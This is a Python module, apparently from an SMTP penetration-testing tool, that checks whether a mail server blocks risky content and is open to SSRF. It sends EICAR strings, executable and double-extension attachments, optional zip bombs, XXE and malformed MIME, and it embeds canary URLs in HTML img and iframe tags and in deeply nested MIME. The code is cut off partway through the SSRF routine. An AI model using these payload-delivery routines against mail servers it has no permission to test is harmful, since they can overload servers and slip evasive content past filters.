import ipaddress, json, smtplib, socket, ssl, time, zipfile
from io import BytesIO
from email.encoders import encode_base64
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path


try:
    from ntlm_auth.ntlm import NtlmContext
except ImportError:
    NtlmContext = None

from ...utils import ptprinthelper
from ...decompression_payloads import BILLION_LAUGHS_XML, build_full_zip_bomb, build_minimal_zip_bomb

try:
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import rsa
    _HAS_CRYPTOGRAPHY = True
except ImportError:
    _HAS_CRYPTOGRAPHY = False

from ..helpers import *
from ..results import *
from ..registry import *


class ContentMixin:

    def _av_category_title(self, category: str) -> str:
        return AV_CATEGORY_TITLES.get(
            category,
            category.replace("_", " ").strip().title() + " test",
        )

    @staticmethod
    def _av_payload_label(msg_def: dict) -> str:
        attachments = msg_def.get("attachments") or []
        if attachments:
            return str(attachments[0])
        if msg_def.get("rawEml"):
            return str(msg_def["rawEml"])
        if msg_def.get("bodyPlainEicar"):
            return "body (plain EICAR)"
        if msg_def.get("bodyBase64") is not None:
            return "body (base64)"
        if msg_def.get("bodyQuotedPrintable") is not None:
            return "body (quoted-printable)"
        if msg_def.get("bodyHtml"):
            return "body (HTML)"
        return "message body"

    @staticmethod
    def _av_expand_msg_defs(msg_def: dict) -> list[dict]:
        """One SMTP transaction per payload (industry AV testing practice)."""
        attachments = msg_def.get("attachments") or []
        if len(attachments) <= 1:
            return [msg_def]
        return [{**msg_def, "attachments": [name]} for name in attachments]

    def _av_payload_summary_line(
        self,
        msg_def: dict | None,
        fallback_name: str,
        status: int | None,
        outcome: str,
    ) -> str:
        label = self._av_payload_label(msg_def) if msg_def else fallback_name
        if status is not None:
            return f"{label}: {status} ({outcome})"
        return f"{label}: ({outcome})"

    def _av_record_payload_result(
        self,
        summaries: list[str],
        test_ids: list[str],
        msg_def: dict | None,
        fallback_name: str,
        status: int | None,
        outcome: str,
        *,
        test_id: str = "",
    ) -> tuple[str, str]:
        summary = self._av_payload_summary_line(msg_def, fallback_name, status, outcome)
        summaries.append(summary)
        payload_test_id = test_id if outcome == "accepted" and test_id else ""
        test_ids.append(payload_test_id)
        return summary, payload_test_id

    @staticmethod
    def _av_summary_payload_label(summary_line: str) -> str:
        if ":" in summary_line:
            return summary_line.split(":", 1)[0].strip()
        return summary_line.strip()

    def _av_stream_payload_block(
        self,
        payload_trace: tuple[str, ...] | list[str],
        summary_line: str,
        payload_test_id: str,
        rcpt: str,
    ) -> None:
        """Under -vv: payload label, indented SMTP trace, then mail-sent / outcome."""
        pp = ptprinthelper.ptprint
        pp(
            self._av_summary_payload_label(summary_line),
            bullet_type="TEXT",
            condition=True,
            indent=8,
        )
        for line in payload_trace:
            if line.startswith("---"):
                continue
            self._stream_smtp_trace_line(line, indent_override=12)
        if "(accepted)" in summary_line and payload_test_id:
            self._pp_mail_probe_line(
                pp,
                True,
                accepted=True,
                sent_msg=self._mail_sent_inbox_msg(rcpt, payload_test_id),
                indent=12,
            )
        elif ":" in summary_line:
            tail = summary_line.split(":", 1)[1].strip()
            if tail:
                pp(tail, bullet_type="TEXT", condition=True, indent=12)

    def _ssrf_variant_title(self, variant: str) -> str:
        return SSRF_VARIANT_TITLES.get(
            variant,
            variant.replace("_", " ").strip().title() + " test",
        )

    def _ssrf_variant_payload_label(self, variant: str) -> str:
        return SSRF_VARIANT_PAYLOAD_LABELS.get(
            variant,
            variant.replace("_", " "),
        )

    def _ssrf_variant_outcome_line(self, v: SsrfVariantResult) -> str:
        label = self._ssrf_variant_payload_label(v.variant)
        if v.accepted > 0:
            for line in reversed(v.smtp_trace):
                if line.startswith("DATA:"):
                    code = self._data_trace_status_code(line) or "250"
                    return f"{label}: {code} (accepted)"
            return f"{label}: 250 (accepted)"
        if v.rejected > 0:
            for line in reversed(v.smtp_trace):
                if line.startswith("RCPT TO"):
                    parts = line.split(":", 1)[1].strip().split()
                    code = parts[0] if parts else "?"
                    return f"{label}: {code} (rejected)"
                if line.startswith("DATA:"):
                    code = self._data_trace_status_code(line) or "?"
                    return f"{label}: {code} (rejected)"
            return f"{label}: (rejected)"
        if v.error > 0:
            return f"{label}: (error)"
        return f"{label}: (skipped)"

    def _ssrf_stream_variant_section(
        self,
        v: SsrfVariantResult,
        rcpt: str,
        *,
        stream_trace: bool = False,
    ) -> None:
        """Per-variant terminal block for -ssrf."""
        pp = ptprinthelper.ptprint
        pp(self._ssrf_variant_title(v.variant), bullet_type="TITLE", condition=True, indent=4)
        if stream_trace:
            for line in v.smtp_trace:
                if line.startswith("---"):
                    continue
                self._stream_smtp_trace_line(line, indent_override=8)
        pp(self._ssrf_variant_outcome_line(v), bullet_type="TEXT", condition=True, indent=8)
        if v.detail:
            pp(f"Summary: {v.detail}", bullet_type="TEXT", condition=True, indent=8)
        if v.accepted > 0 and v.test_id:
            self._pp_mail_probe_line(
                pp,
                True,
                accepted=True,
                sent_msg=self._mail_sent_inbox_msg(rcpt, v.test_id),
                indent=8,
            )

    def _zipxxe_variant_title(self, variant: str) -> str:
        return ZIPXXE_VARIANT_TITLES.get(
            variant,
            variant.replace("_", " ").strip().title() + " test",
        )

    def _zipxxe_variant_payload_label(self, variant: str) -> str:
        return ZIPXXE_VARIANT_PAYLOAD_LABELS.get(
            variant,
            variant.replace("_", " "),
        )

    def _zipxxe_variant_outcome_line(self, v: ZipxxeVariantResult) -> str:
        label = self._zipxxe_variant_payload_label(v.variant)
        if v.accepted > 0:
            for line in reversed(v.smtp_trace):
                if line.startswith("DATA:"):
                    code = self._data_trace_status_code(line) or "250"
                    return f"{label}: {code} (accepted)"
            return f"{label}: 250 (accepted)"
        if v.rejected > 0:
            for line in reversed(v.smtp_trace):
                if line.startswith("RCPT TO"):
                    parts = line.split(":", 1)[1].strip().split()
                    code = parts[0] if parts else "?"
                    return f"{label}: {code} (rejected)"
                if line.startswith("DATA:"):
                    code = self._data_trace_status_code(line) or "?"
                    return f"{label}: {code} (rejected)"
            return f"{label}: (rejected)"
        if v.error > 0:
            return f"{label}: (error)"
        return f"{label}: (skipped)"

    def _zipxxe_stream_variant_section(
        self,
        v: ZipxxeVariantResult,
        rcpt: str,
        *,
        stream_trace: bool = False,
    ) -> None:
        """Per-variant terminal block for -zipxxe."""
        pp = ptprinthelper.ptprint
        pp(self._zipxxe_variant_title(v.variant), bullet_type="TITLE", condition=True, indent=4)
        if stream_trace:
            for line in v.smtp_trace:
                if line.startswith("---"):
                    continue
                self._stream_smtp_trace_line(line, indent_override=8)
        pp(self._zipxxe_variant_outcome_line(v), bullet_type="TEXT", condition=True, indent=8)
        if v.detail:
            pp(f"Summary: {v.detail}", bullet_type="TEXT", condition=True, indent=8)
        if v.accepted > 0 and v.test_id:
            self._pp_mail_probe_line(
                pp,
                True,
                accepted=True,
                sent_msg=self._mail_sent_inbox_msg(rcpt, v.test_id),
                indent=8,
            )

    def _get_antivirus_definitions_path(self) -> Path:
        """Return base path for antivirus test definitions (ptsrvtester/tests/smtp/antivirus)."""
        # parents[3] = ptsrvtester package root (this file is modules/smtp/tests/content.py)
        return Path(__file__).resolve().parents[3] / "tests" / "smtp" / "antivirus"

    def test_antivirus(self) -> AntivirusResult:
        """
        Test antivirus/antispam protection (PTL-SVC-SMTP-ANTIVIRUS).
        Sends prepared test messages and records accepted vs rejected vs error per category.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        mail_from = self.args.mail_from or f"avtest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        cc_raw = getattr(self.args, "cc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()] if cc_raw else []
        timeout = max(5.0, getattr(self.args, "antivirus_timeout", 30.0))
        skip_absent = getattr(self.args, "antivirus_skip_absent", False)
        incl_zip_bomb = getattr(self.args, "antivirus_zip_bomb", False)
        cats_arg = getattr(self.args, "antivirus_categories", None)
        default_cats = [
            "eicar", "double_ext", "executable", "nested_archive",
            "encoded_content", "html_sanitization", "xxe", "mime_malformed",
        ]
        if cats_arg:
            categories = [c.strip().lower() for c in cats_arg.split(",") if c.strip()]
        else:
            categories = list(default_cats)
        if incl_zip_bomb and "zip_bomb" not in categories:
            categories.append("zip_bomb")

        base_path = self._get_antivirus_definitions_path()
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        cc_hdr = ", ".join(f"<{c}>" for c in cc_list) if cc_list else ""
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        recipients = [rcpt] + cc_list
        start_time = time.perf_counter()
        auth_used = False
        cat_results: list[AntivirusCategoryResult] = []
        self._antivirus_streamed_live = False
        # Categories where accepted > 0 yields VULNERABLE: evasion, recursive decompression,
        # encoded content (AV must decode before scan), HTML/XSS, XXE, malformed MIME
        RISKY_CATEGORIES = frozenset({
            "eicar", "double_ext", "executable", "nested_archive",
            "encoded_content", "html_sanitization", "xxe", "mime_malformed",
        })
        def _av_smtp_reply(status: int, reply) -> str:
            text = self.bytes_to_str(reply).strip().replace("\r\n", " ").replace("\n", " ")
            return f"{status} {text}" if text else str(status)

        def _av_fail_line(trace: list[str], line: str) -> None:
            trace.append(line)

        def _connect_av() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            """Connect to SMTP. Optional AUTH LOGIN after EHLO when -u/-p (or -U/-P) are set."""
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_mime(msg_def: dict, att_dir: Path, msg_dir: Path, test_id: str) -> tuple[str, list[str]]:
            """
            Build MIME message. Returns (msg_str, missing_attachments).
            If any requested attachment is missing, list is non-empty – caller should not send
            (avoids false SECURE when message has no payload).
            Supports: bodyBase64, bodyQuotedPrintable (encoded_content), rawEml (mime_malformed).
            """
            subject = self._outbound_subject()
            body_base64 = msg_def.get("bodyBase64")
            body_qp = msg_def.get("bodyQuotedPrintable")
            raw_eml = msg_def.get("rawEml")
            attachments = msg_def.get("attachments") or []
            custom_headers = msg_def.get("headers") or {}
            missing: list[str] = []

            if raw_eml:
                eml_path = msg_dir / raw_eml
                if not eml_path.is_file():
                    missing.append(raw_eml)
                    return "", missing
                with open(eml_path, "rb") as f:
                    raw = f.read().decode("utf-8", errors="replace")
                raw = raw.replace("{FROM}", from_hdr).replace("{TO}", f"<{rcpt}>").replace("{SUBJECT}", subject)
                if cc_hdr:
                    raw = raw.replace("{CC}", cc_hdr)
                else:
                    raw = raw.replace("Cc: {CC}\r\n", "")
                return self._mime_add_test_id_header(raw, test_id), missing

            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            if cc_hdr:
                msg["Cc"] = cc_hdr
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg[EMAIL_HDR_TEST] = EMAIL_TEST_ANTIVIRUS
            msg[EMAIL_HDR_TEST_ID] = test_id
            for k, v in custom_headers.items():
                msg[k] = str(v)

            if body_base64 is not None:
                part = MIMEText("", "plain", "utf-8")
                part.set_payload(body_base64)
                part["Content-Transfer-Encoding"] = "base64"
                msg.attach(part)
            elif body_qp is not None:
                part = MIMEText("", "plain", "utf-8")
                part.set_payload(body_qp)
                part["Content-Transfer-Encoding"] = "quoted-printable"
                msg.attach(part)
            else:
                if msg_def.get("bodyPlainEicar"):
                    eicar_line = (
                        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
                    )
                    intro = str(msg_def.get("body") or "").strip()
                    body = f"{eicar_line}\n\n{intro}" if intro else eicar_line
                elif "body" in msg_def:
                    body = str(msg_def["body"])
                else:
                    body = self._outbound_data()
                msg.attach(MIMEText(body, "plain", "utf-8"))
            body_html = msg_def.get("bodyHtml")
            if body_html:
                msg.attach(MIMEText(body_html, "html", "utf-8"))
            for att_name in attachments:
                att_path = att_dir / att_name
                if not att_path.is_file():
                    missing.append(att_name)
                    continue
                part = MIMEBase("application", "octet-stream")
                with open(att_path, "rb") as f:
                    part.set_payload(f.read())
                encode_base64(part)
                part.add_header("Content-Disposition", "attachment", filename=att_name)
                msg.attach(part)
            return msg.as_string(), missing

        for cat in categories:
            cat_path = base_path / "categories" / cat
            msg_dir = cat_path / "messages"
            att_dir = cat_path / "attachments"
            msg_files = sorted(msg_dir.glob("*.json")) if msg_dir.is_dir() else []
            if not msg_files and skip_absent:
                continue
            if not msg_files:
                _empty_detail = (
                    f"No definition files in {msg_dir}" if msg_dir.is_dir() else "Category path missing"
                )
                cat_results.append(
                    AntivirusCategoryResult(
                        category=cat,
                        sent=0,
                        accepted=0,
                        rejected=0,
                        error=0,
                        smtp_trace=(),
                        detail=_empty_detail,
                    )
                )
                if not self.use_json and self.args.debug:
                    ptprinthelper.ptprint(
                        f"{self._av_category_title(cat)}: {_empty_detail}",
                        bullet_type="TITLE",
                        condition=True,
                        indent=4,
                    )
                continue
            accepted, rejected, err_count = 0, 0, 0
            smtp_trace: list[str] = []
            msg_summaries: list[str] = []
            payload_test_ids: list[str] = []
            last_accepted_test_id = ""
            sent = 0
            stream_av = not self.use_json and self.args.debug
            if stream_av:
                self._antivirus_streamed_live = True
                ptprinthelper.ptprint(
                    self._av_category_title(cat),
                    bullet_type="TITLE",
                    condition=True,
                    indent=4,
                )

            def _av_emit_payload(
                payload_trace: list[str],
                msg_def: dict | None,
                fallback_name: str,
                status: int | None,
                outcome: str,
                *,
                test_id: str = "",
            ) -> None:
                summary, payload_test_id = self._av_record_payload_result(
                    msg_summaries,
                    payload_test_ids,
                    msg_def,
                    fallback_name,
                    status,
                    outcome,
                    test_id=test_id,
                )
                if stream_av:
                    self._av_stream_payload_block(
                        payload_trace, summary, payload_test_id, rcpt
                    )

            for mf in msg_files:
                msg_def: dict | None = None
                try:
                    with open(mf, encoding="utf-8") as f:
                        msg_def = json.load(f)
                except (json.JSONDecodeError, OSError) as e:
                    err_count += 1
                    fail_line = f"{mf.name}: load error {e}"
                    _av_fail_line(smtp_trace, fail_line)
                    _av_emit_payload([fail_line], None, mf.name, None, "error")
                    continue
                payload_defs = self._av_expand_msg_defs(msg_def)
                for payload_def in payload_defs:
                    payload_trace: list[str] = []
                    payload_label = self._av_payload_label(payload_def)
                    trace_name = (
                        f"{mf.name} ({payload_label})"
                        if len(payload_defs) > 1
                        else mf.name
                    )

                    def _av_payload_trace_store(line: str) -> None:
                        smtp_trace.append(line)
                        payload_trace.append(line)

                    def _av_payload_fail_line(line: str) -> None:
                        smtp_trace.append(line)
                        payload_trace.append(line)

                    msg_test_id = self._new_mail_test_id()
                    raw_msg, missing_att = _build_mime(payload_def, att_dir, msg_dir, msg_test_id)
                    if missing_att:
                        err_count += 1
                        warn_msg = (
                            f"{trace_name}: missing attachments {missing_att} "
                            "– test incomplete (avoid false SECURE)"
                        )
                        _av_payload_fail_line(warn_msg)
                        _av_emit_payload(payload_trace, payload_def, trace_name, None, "error")
                        ptprinthelper.ptprint(
                            f"{self._av_category_title(cat)}: {warn_msg}",
                            bullet_type="WARNING",
                            condition=not self.use_json and not self.args.debug,
                            indent=4,
                        )
                        continue
                    smtp, conn_err = _connect_av()
                    if smtp is None:
                        err_count += 1
                        _av_payload_fail_line(f"{trace_name}: connection failed {conn_err}")
                        _av_emit_payload(payload_trace, payload_def, trace_name, None, "error")
                        continue
                    try:
                        _av_payload_trace_store(f"--- {trace_name} ---")
                        ehlo_status, ehlo_reply = smtp.docmd("EHLO", self.fqdn or "av-test.local")
                        _av_payload_trace_store(f"EHLO: {_av_smtp_reply(ehlo_status, ehlo_reply)}")
                        used_auth, auth_err = self._mail_test_auth_login(
                            smtp,
                            smtp_trace,
                            trace_append=_av_payload_trace_store,
                        )
                        if auth_err:
                            err_count += 1
                            _av_payload_fail_line(f"{trace_name}: {auth_err}")
                            _av_emit_payload(payload_trace, payload_def, trace_name, None, "error")
                            try:
                                smtp.quit()
                            except Exception:
                                pass
                            continue
                        if used_auth:
                            auth_used = True
                        mail_status, mail_reply = smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                        _av_payload_trace_store(
                            f"MAIL FROM <{mail_from}>: {_av_smtp_reply(mail_status, mail_reply)}"
                        )
                        if mail_status not in (250, 251):
                            rejected += 1
                            sent += 1
                            _av_emit_payload(
                                payload_trace,
                                payload_def,
                                trace_name,
                                mail_status,
                                "rejected",
                            )
                            try:
                                smtp.quit()
                            except Exception:
                                pass
                            continue
                        rcpt_status, rcpt_reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                        _av_payload_trace_store(
                            f"RCPT TO <{rcpt}>: {_av_smtp_reply(rcpt_status, rcpt_reply)}"
                        )
                        if rcpt_status not in (250, 251):
                            rejected += 1
                            sent += 1
                            _av_emit_payload(
                                payload_trace,
                                payload_def,
                                trace_name,
                                rcpt_status,
                                "rejected",
                            )
                            try:
                                smtp.quit()
                            except Exception:
                                pass
                            continue
                        cc_failed = False
                        for c in cc_list:
                            cc_status, cc_reply = smtp.docmd("RCPT", f"TO:<{c}>")
                            _av_payload_trace_store(
                                f"RCPT TO <{c}>: {_av_smtp_reply(cc_status, cc_reply)}"
                            )
                            if cc_status not in (250, 251):
                                rejected += 1
                                sent += 1
                                _av_emit_payload(
                                    payload_trace,
                                    payload_def,
                                    trace_name,
                                    cc_status,
                                    "rejected",
                                )
                                cc_failed = True
                                try:
                                    smtp.quit()
                                except Exception:
                                    pass
                                break
                        if not cc_failed:
                            data_status, data_reply = smtp.data(raw_msg)
                            _av_payload_trace_store(
                                self._data_trace_entry(
                                    raw_msg, reply=_av_smtp_reply(data_status, data_reply)
                                )
                            )
                            sent += 1
                            if data_status == 250:
                                accepted += 1
                                last_accepted_test_id = msg_test_id
                                _av_emit_payload(
                                    payload_trace,
                                    payload_def,
                                    trace_name,
                                    data_status,
                                    "accepted",
                                    test_id=msg_test_id,
                                )
                            else:
                                rejected += 1
                                _av_emit_payload(
                                    payload_trace,
                                    payload_def,
                                    trace_name,
                                    data_status,
                                    "rejected",
                                )
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                    except (
                        smtplib.SMTPResponseException,
                        smtplib.SMTPServerDisconnected,
                        ConnectionResetError,
                        BrokenPipeError,
                        OSError,
                        socket.timeout,
                    ) as e:
                        err_count += 1
                        _av_payload_fail_line(f"{trace_name}: error {e}")
                        _av_emit_payload(payload_trace, payload_def, trace_name, None, "error")
                        try:
                            smtp.quit()
                        except Exception:
                            pass

            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error"
            cat_result = AntivirusCategoryResult(
                category=cat,
                sent=sent,
                accepted=accepted,
                rejected=rejected,
                error=err_count,
                smtp_trace=tuple(smtp_trace),
                detail=detail,
                message_summary=tuple(msg_summaries),
                test_id=last_accepted_test_id,
                payload_test_ids=tuple(payload_test_ids),
            )
            cat_results.append(cat_result)

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(c.accepted for c in cat_results)
        total_rejected = sum(c.rejected for c in cat_results)
        total_sent = sum(c.sent for c in cat_results)
        total_error = sum(c.error for c in cat_results)
        risky_accepted = sum(c.accepted for c in cat_results if c.category in RISKY_CATEGORIES)
        risky_sent = sum(c.sent for c in cat_results if c.category in RISKY_CATEGORIES)
        all_error = all(c.sent == 0 or (c.error == c.sent) for c in cat_results) and len(cat_results) > 0
        # Nothing was even attempted (sent == 0, error == 0) → payload definitions are missing,
        # not a connection/rate-limit failure. Keep this distinct so the hint is actionable.
        no_payloads = len(cat_results) > 0 and total_sent == 0 and total_error == 0
        indeterminate = all_error or (len(cat_results) == 0)
        vulnerable = risky_accepted > 0 and risky_sent > 0
        partial_protection = not vulnerable and total_accepted > 0 and total_rejected > 0
        if indeterminate:
            if no_payloads:
                detail = (
                    f"No payload definitions found under {base_path / 'categories'} "
                    "(expected <category>/messages/*.json) — check the installed package data files"
                )
            elif all_error and total_accepted == 0 and total_rejected == 0:
                detail = (
                    "Test incomplete: all message attempts failed before RCPT/DATA "
                    "(connection refused, timeout, or rate limiting — retry in a few seconds)"
                )
            elif len(cat_results) == 0:
                detail = "No test categories available"
            else:
                detail = "Could not complete antivirus test"
        elif not vulnerable:
            detail = "All risky content blocked"
        else:
            detail = f"Risky content passed: {risky_accepted}/{risky_sent} in risky categories"
        return AntivirusResult(
            vulnerable=vulnerable,
            indeterminate=indeterminate,
            partial_protection=partial_protection,
            categories=tuple(cat_results),
            elapsed_sec=elapsed,
            auth_used=auth_used,
            detail=detail,
        )

    def _get_ssrf_definitions_path(self) -> Path:
        """Base path for SSRF variant definitions (ptsrvtester/tests/smtp/ssrf)."""
        # parents[3] = ptsrvtester package root (this file is modules/smtp/tests/content.py)
        return Path(__file__).resolve().parents[3] / "tests" / "smtp" / "ssrf"

    def test_ssrf(self) -> SsrfResult:
        """
        Test SSRF – server fetches links in messages (PTL-SVC-SMTP-SSRF).
        Sends test emails with canary URL; user must verify canary for incoming requests.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        canary_url = str(getattr(self.args, "ssrf_canary_url", "")).strip()
        mail_from = self.args.mail_from or f"ssrftest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        cc_raw = getattr(self.args, "cc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()] if cc_raw else []
        timeout = max(5.0, getattr(self.args, "ssrf_timeout", 30.0))
        incl_internal = getattr(self.args, "ssrf_internal_urls", False)
        variants_arg = getattr(self.args, "ssrf_variants", None)
        default_variants = ["plain", "html_link", "html_img", "html_iframe", "multipart", "ssrf_malformed", "ssrf_nested"]
        if variants_arg:
            variants = [v.strip().lower() for v in variants_arg.split(",") if v.strip()]
        else:
            variants = list(default_variants)

        base_path = self._get_ssrf_definitions_path()
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        cc_hdr = ", ".join(f"<{c}>" for c in cc_list) if cc_list else ""
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        recipients = [rcpt] + cc_list
        start_time = time.perf_counter()
        auth_used = False
        var_results: list[SsrfVariantResult] = []
        self._ssrf_streamed_live = False
        self._ssrf_canary_streamed = False
        VERIFICATION_INSTRUCTIONS = (
            "Monitor your canary URL for 2–5 minutes. If HTTP/HTTPS request arrives from MTA IP, verdict is VULNERABLE (SSRF)."
        )

        def _ssrf_trace_append(trace: list[str], line: str) -> None:
            trace.append(line)

        if not self.use_json and self.args.debug and canary_url:
            pp = ptprinthelper.ptprint
            pp("Canary URL", bullet_type="TITLE", condition=True, indent=4)
            pp(canary_url, bullet_type="TEXT", condition=True, indent=8)
            self._ssrf_canary_streamed = True

        def _connect_ssrf() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_ssrf_mime(subject: str, body: str, body_html: str | None, test_id: str) -> str:
            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            if cc_hdr:
                msg["Cc"] = cc_hdr
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg[EMAIL_HDR_TEST] = EMAIL_TEST_SSRF
            msg[EMAIL_HDR_TEST_ID] = test_id
            msg.attach(MIMEText(body, "plain", "utf-8"))
            if body_html:
                msg.attach(MIMEText(body_html, "html", "utf-8"))
            return msg.as_string()

        # Inline fallback when no definition files
        FALLBACK_VARIANTS: dict[str, dict] = {
            "plain": {"subject": "SSRF test - plain", "body": "Test SSRF: {{CANARY_URL}}", "bodyHtml": None},
            "html_link": {"subject": "SSRF test - HTML link", "body": "Link below.", "bodyHtml": '<html><body><a href="{{CANARY_URL}}">link</a></body></html>'},
            "html_img": {"subject": "SSRF test - HTML img", "body": "Image below.", "bodyHtml": '<html><body><img src="{{CANARY_URL}}" /></body></html>'},
            "html_iframe": {"subject": "SSRF test - HTML iframe", "body": "Iframe.", "bodyHtml": '<html><body><iframe src="{{CANARY_URL}}"></iframe></body></html>'},
            "multipart": {"subject": "SSRF test - multipart", "body": "Plain: {{CANARY_URL}}", "bodyHtml": '<html><body><a href="{{CANARY_URL}}">link</a></body></html>'},
            "ssrf_malformed": {"subject": "SSRF test - Malformed MIME"},
            "ssrf_nested": {"subject": "SSRF test - Deeply Nested"},
        }

        def _build_ssrf_malformed_mime(subject: str, test_id: str) -> str:
            """Malformed MIME – wrong boundary in nested part (parser differential test)."""
            bnd1, bnd_wrong = "BND1", "BND_WRONG"
            plain_body = self._outbound_data_with_url(canary_url)
            raw = (
                f"From: {from_hdr}\r\n"
                f"To: <{rcpt}>\r\n"
                f"Subject: {subject}\r\n"
                f"{EMAIL_HDR_TEST_ID}: {test_id}\r\n"
                f"MIME-Version: 1.0\r\n"
                f'Content-Type: multipart/mixed; boundary="{bnd1}"\r\n\r\n'
                f"--{bnd1}\r\n"
                "Content-Type: text/plain\r\n\r\n"
                f"{plain_body}\r\n"
                f"--{bnd1}\r\n"
                f'Content-Type: multipart/alternative; boundary="BND2"\r\n\r\n'
                f"--{bnd_wrong}\r\n"
                "Content-Type: text/plain\r\n\r\n"
                f"{plain_body}\r\n"
                f"--{bnd1}--\r\n"
            )
            return raw

        def _build_ssrf_nested_mime(subject: str, test_id: str, layers: int = 10) -> str:
            """Deeply nested multipart/alternative – canary URL in innermost part (parser differential)."""
            boundaries = [f"NEST{i}" for i in range(layers)]
            innermost = (
                f"Content-Type: text/plain; charset=utf-8\r\n\r\n"
                f"{self._outbound_data_with_url(canary_url)}\r\n"
            )
            body_part = innermost
            for i in range(layers - 1, 0, -1):
                b = boundaries[i]
                body_part = (
                    f'Content-Type: multipart/alternative; boundary="{b}"\r\n\r\n'
                    f"--{b}\r\n"
                    f"{body_part}"
                    f"--{b}--\r\n"
                )
            top_boundary = boundaries[0]
            body = f"--{top_boundary}\r\n{body_part}--{top_boundary}--\r\n"
            msg = (
                f"From: {from_hdr}\r\n"
                f"To: <{rcpt}>\r\n"
                f"Subject: {subject}\r\n"
                f"MIME-Version: 1.0\r\n"
                f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                f"{EMAIL_HDR_TEST}: {EMAIL_TEST_SSRF}\r\n"
                f"{EMAIL_HDR_TEST_ID}: {test_id}\r\n"
                f'Content-Type: multipart/alternative; boundary="{top_boundary}"\r\n'
                f"\r\n{body}"
            )
            return msg

        for var_name in variants:
            var_path = base_path / "variants" / var_name
            msg_dir = var_path / "messages"
            msg_files = sorted(msg_dir.glob("*.json")) if msg_dir.is_dir() else []
            if not msg_files and var_name not in FALLBACK_VARIANTS:
                continue
            defs_to_use = FALLBACK_VARIANTS.get(var_name, {})
            if msg_files:
                try:
                    with open(msg_files[0], encoding="utf-8") as f:
                        defs_to_use = json.load(f)
                except (json.JSONDecodeError, OSError):
                    pass
            subject = self._outbound_subject()
            ssrf_test_id = self._new_mail_test_id()
            if var_name == "ssrf_malformed":
                raw_msg = _build_ssrf_malformed_mime(subject, ssrf_test_id)
            elif var_name == "ssrf_nested":
                raw_msg = _build_ssrf_nested_mime(subject, ssrf_test_id)
            else:
                body = self._outbound_data_with_url(canary_url)
                body_html = defs_to_use.get("bodyHtml")
                if body_html:
                    body_html = body_html.replace("{{CANARY_URL}}", canary_url)
                raw_msg = _build_ssrf_mime(subject, body, body_html, ssrf_test_id)
